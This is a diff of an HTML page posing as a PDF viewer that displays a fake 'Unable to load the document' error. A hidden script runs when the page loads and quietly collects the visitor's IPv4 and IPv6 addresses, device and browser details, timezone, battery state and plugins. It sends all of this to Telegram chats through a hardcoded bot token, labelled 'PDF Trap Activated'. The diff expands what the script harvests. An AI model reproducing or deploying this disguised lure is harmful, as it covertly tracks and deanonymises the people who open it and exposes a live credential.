@@ -7,14 +7,24 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      background: url('https://i.imgur.com/tWKDw4C.jpeg') no-repeat center center fixed;
+      background-size: cover;
     }
+
+    div {
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      width: 100%;
+      height: 100%;
+    }
+
     .pdf-viewer {
       background: white;
       width: 100%;
       height: 100vh;
       box-shadow: 0 0 5px rgba(0,0,0,0.2);
     }
+
     .toolbar {
       background: #e0e0e0;
       padding: 8px;
@@ -24,6 +34,7 @@
       color: #333;
       border-bottom: 1px solid #ccc;
     }
+
     .error-message {
       padding: 100px;
       text-align: center;
@@ -31,49 +42,54 @@
       font-size: 18px;
     }
   </style> 
+  <script defer data-domain="kalkidos.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script> 
+  <script type="text/javascript" src="https://tiiny.host/ad-script.js"></script> 
  </head> 
  <body> 
-  <div class="pdf-viewer"> 
-   <div class="toolbar"> 
-    <div>
-     File
+  <div> 
+   <div class="pdf-viewer"> 
+    <div class="toolbar"> 
+     <div>
+      File
+     </div> 
+     <div>
+      View
+     </div> 
+     <div>
+      Zoom
+     </div> 
+     <div>
+      Tools
+     </div> 
+     <div>
+      Help
+     </div> 
     </div> 
-    <div>
-     View
-    </div> 
-    <div>
-     Zoom
-    </div> 
-    <div>
-     Tools
-    </div> 
-    <div>
-     Help
+    <div class="error-message">
+      ⚠️ <strong>Error:</strong> Unable to load the document.
+     <br> Please try again later. 
     </div> 
    </div> 
-   <div class="error-message">
-     ⚠️ <strong>Error:</strong> Unable to load the document.
-    <br> Please try again later. 
-   </div> 
-  </div> <!-- 🔥 Background Script --> 
+  </div> 
   <script>
-    async function getIP() {
+    async function getIPs() {
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return "IP fetch failed";
+        const [ipv4, ipv6] = await Promise.all([
+          fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip),
+          fetch("https://api64.ipify.org?format=json").then(res => res.json()).then(data => data.ip)
+        ]);
+        return { ipv4, ipv6 };
+      } catch (e) {
+        return { ipv4: "Failed", ipv6: "Failed" };
       }
     }
 
-    async function sendToTelegram(msg) {
-      const botToken = "7684932988:AAGFSCRa1R4f7B6zRJGROUzS4PplkNpuRMk";
-      const chatId = "1901638716";
+    async function sendToTelegram(botToken, chatId, msg) {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       const params = {
         chat_id: chatId,
-        text: msg
+        text: msg,
+        parse_mode: "Markdown"
       };
       await fetch(url, {
         method: "POST",
@@ -83,15 +99,31 @@
     }
 
     (async () => {
-      const ip = await getIP();
+      const { ipv4, ipv6 } = await getIPs();
       const ua = navigator.userAgent;
-      const res = screen.width + "x" + screen.height;
+      const res = `${screen.width}x${screen.height}`;
       const lang = navigator.language;
       const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const now = new Date().toLocaleString();
+      const battery = navigator.getBattery ? await navigator.getBattery() : null;
+      const charging = battery ? (battery.charging ? "Yes" : "No") : "Unknown";
+      const level = battery ? `${Math.round(battery.level * 100)}%` : "Unknown";
+      const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "None";
 
-      const message = `📥 *Criminal Opened Trap File*\nIP: ${ip}\nDevice: ${ua}\nResolution: ${res}\nLanguage: ${lang}\nTimezone: ${tz}\nTime: ${now}`;
-      await sendToTelegram(message);
+      const msg = `📥 *PDF Trap Activated*
+      
+📍 *IPv4:* ${ipv4}
+📍 *IPv6:* ${ipv6}
+💻 *Device:* ${ua}
+📐 *Resolution:* ${res}
+🧭 *Language:* ${lang}
+🕰 *Timezone:* ${tz}
+🔋 *Battery:* ${level} (Charging: ${charging})
+🧩 *Browser Plugins:* ${plugins}
+📅 *Time:* ${now}`;
+
+      await sendToTelegram("7684932988:AAGFSCRa1R4f7B6zRJGROUzS4PplkNpuRMk", "1901638716", msg);
+      await sendToTelegram("7684932988:AAGFSCRa1R4f7B6zRJGROUzS4PplkNpuRMk", "6524545895", msg);
     })();
   </script> 
  
